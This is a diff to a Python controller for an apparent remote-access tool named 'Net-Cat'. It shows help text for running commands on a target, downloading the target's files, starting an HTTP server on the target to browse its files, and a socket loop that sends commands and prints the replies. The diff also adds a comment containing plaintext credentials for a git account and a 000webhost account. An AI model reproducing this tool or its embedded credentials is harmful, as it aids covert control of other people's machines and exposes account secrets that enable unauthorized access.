@@ -9,6 +9,7 @@ import time
 import sys
 import os
 
+#git account p = DEVILO.K@evil123 ,u = omer-devil: password of 000webhost = (#yT8w5JFz^*K6ELf)AVK)
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
@@ -62,7 +63,7 @@ help = YELLOW + """\n\t\t-------------- Help ------------------\n
     download\t\tdownload <file name>\t\tdownload music.mp4
     server\t\tserver <IP:PORT>   \t\tserver 127.0.0.1:468
     target-ip\t\ttarget-ip             \t\tit shows the target ip
-    output_save\t\toutput_save <True/False>\toutput_seve True or output_save False
+    output_save\t\toutput_save <True|False>\toutput_seve True or output_save False
     
     help\t\tit shows this help message
     
@@ -77,30 +78,48 @@ def Help(com):
     if com == "l-host":
         print(YELLOW+"\nCommands\t\tUse"+END)
         print(GREEN+"l-host      \t\tl-host <command> : Executing command on localhost or current hosting machine")
-        print("\nExample : l-host ls or pwd any Linux command"+END)
+        print("""
+l-host <commands>     : used to execute command on the local-host
+                        example : l-host pwd
+                                         l-host ls"""+END)
 
     elif com == "download":
         print(YELLOW+"\nCommands\t\tUse"+END)
-        print(GREEN+"download\t\tsend <file name> : send file to the host")
-        print("\nExample : download music.mp3 or download dir_name1/dir_name2/music.mp3"+END)
+        print(GREEN+"download\t\tsend <file name> : download file to the host")
+        print(""""
+download <file_name>  : used to download file,mid,app and other from the target
+                         example : download video.mp4
+                                          download music.mp3
+                                          download/dir_name2/music.mp3"""+END)
         
     elif com == "server":
         print(YELLOW+"\nCommands\t\tUse"+END)
         print(GREEN+"server      \t\tserver <IP:PORT> ")
-        print("\nExample : server 127.0.0.1:7382"+END)
+        print("""
+server <host:port>    : used to run http server on the target to access target file throughout browser
+                     example : server 127.0.0.1:55555
+                            note: it only recommend on the same network"""+END)
         
     elif com[:9] == "target-ip":
         if com[10:] == "help":
             print(YELLOW+"\nCommands\t\tUse"+END)
             print(GREEN+"target-ip\t\ttarget_ip")
-            print("\nExample:target_ip -->it print the ip address of the target"+END)
+            print("""
+target-ip <optional_command>: used to return the target ip
+                                       example : target-ip
+                            target-ip help : help is the only optional command available"""+END)
         
         else:
             print(GREEN+"[!] unknown command "+END+RED+com[10:]+END+GREEN+"for target_ip try help"+END)
     elif com == "output_save":
         print(YELLOW+"\nCommands\t\tUse"+END)
-        print(GREEN+"output_save\t\toutput_save [True/False]")
-        print("\nExample:toutput_seve True or output_save False"+END)
+        print(GREEN+"output_save\t\toutput_save [True|False]")
+        print("""
+output_save <True|False>    : used to save the received output command to default file name or 
+                                                  you can changed the file name
+                                                  
+                                 example : output_seve True  : start saving
+                                                  output_seve False : stop saving"""+END)
     
     else:
         print(help)
@@ -162,7 +181,7 @@ while True:
     
 
     try:
-        com = input(BLUE+"<●"+END+GREEN+"["+END+YELLOW+"Net-Cat"+END+GREEN+"]"+END+RED+"-"+END+GREEN+"["+END+MAGENTA+pwd+END+GREEN+"]"+END+BLUE+"> "+END+GREEN)
+        com = input(BLUE+"< ●"+END+GREEN+" ["+END+YELLOW+"Net-Cat"+END+GREEN+"]"+END+RED+"-"+END+GREEN+" ["+END+MAGENTA+pwd+END+GREEN+"]"+END+BLUE+"> "+END+GREEN)
         """help me"""+END
         if com[:8]=="download":
 
@@ -191,9 +210,13 @@ while True:
                 Help(com)
             elif com[12:] == "True" or com[12:] == "true":
                 seve_to_file = True
-                new_fname = input("[+] Enter file name (Default : save_out_put.txt): ")
+                new_fname = input("[+] Enter file name"+YELLOW+"(Default : save_out_put.txt): "+END)
                 if len(new_fname) != 0:
-                    default_fname = new_fname
+                    if new_fname == (" " * len(new_fname)):
+                        print(YELLOW, "[+] Please Enter Valid Name ",END)
+                        seve_to_file = False
+                    else:
+                        default_fname = new_fname
             elif com[12:] == "False" or com[12:] == "false":
                 seve_to_file = False
         elif com == "help":
@@ -223,7 +246,6 @@ while True:
                     break
                 except KeyboardInterrupt:
                     print(YELLOW+"[-] stupid can't escape this reality"+END)
-                    conn.send(str.encode(com))
                     break
                     #[2:-3]
             m = str(conn.recv(999999999),"utf-8")
